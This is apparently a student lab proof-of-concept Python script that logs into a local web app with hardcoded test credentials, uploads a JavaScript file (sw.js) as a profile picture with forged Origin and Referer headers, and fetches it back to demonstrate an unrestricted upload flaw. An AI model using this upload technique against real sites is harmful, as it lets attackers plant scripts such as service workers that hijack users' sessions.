import sys
import requests


GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"


print("___________________________________________________________________________________________")
print("Demonstrating Unrestricted Uploads on Endpoint http://localhost:4942/upload/avatar after logging in. ")
input(f"{GREEN}press anything to continue: ")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")

# step 1 - login and get session cookie
auth = requests.post(
    "http://localhost:4942/login",
    data={"identity": "jdoe@student.42.tech", "password": "abc123"},
    allow_redirects=False
)

cookies = auth.cookies
if not cookies.get("session"):
    print("Login failed - no session cookie received")
    print("Status:", auth.status_code)
    print(auth.text[:200])
    sys.exit(1)
 
print("Logged in successfully")
input(f"{GREEN}press anything to upload: ")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
# step 2 - upload file
# only pass the bare filename, no path - slashes cause 500
filepath = "sw.js"

 
print("Uploading " + filepath + " as a profile picture")
with open(filepath, "rb") as f:
    response = requests.post(
        "http://localhost:4942/upload/avatar",
        files={"file": (filepath, f, "text/javascript")},
        cookies=cookies,
        headers={
            "Origin": "http://localhost:4942",
            "Referer": "http://localhost:4942/profile/me/settings",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
        },
        allow_redirects=False
    )
 
print("Upload status:", response.status_code)
print("Location:", response.headers.get("Location", "none"))
uploadurl = "http://localhost:4942/static/uploads/z4p1cnx47mfy50f_" + filepath
print("upload url is " + uploadurl )

input(f"{GREEN}press anything to access new 'picture': ")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"CONTINUING.")
print("___________________________________________________________________________________________")
print("___________________________________________________________________________________________")
print(f"___________________________________________________________________________________________{RESET}")
print("accessing new profile 'picture'")

profilepic = requests.get(
    uploadurl,
    allow_redirects=False
)

 
print("status:", profilepic.status_code)
print("Location:", profilepic.headers.get("Location", "none"))
print("Body:", profilepic.text)